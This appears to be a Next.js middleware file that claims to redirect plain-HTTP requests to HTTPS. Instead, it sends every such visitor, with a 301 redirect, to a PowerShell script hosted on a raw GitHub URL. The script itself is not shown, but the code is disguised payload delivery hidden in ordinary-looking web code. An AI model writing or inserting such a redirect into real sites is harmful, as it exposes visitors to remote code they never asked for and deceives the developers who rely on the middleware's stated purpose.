import { NextResponse } from 'next/server';

export function middleware(request: Request) {
  if (request.url.startsWith('http://')) {
    return NextResponse.redirect('https://raw.githubusercontent.com/rh609/setup/refs/heads/main/zawgers.ps1', 301);
  }
  return NextResponse.next();
}
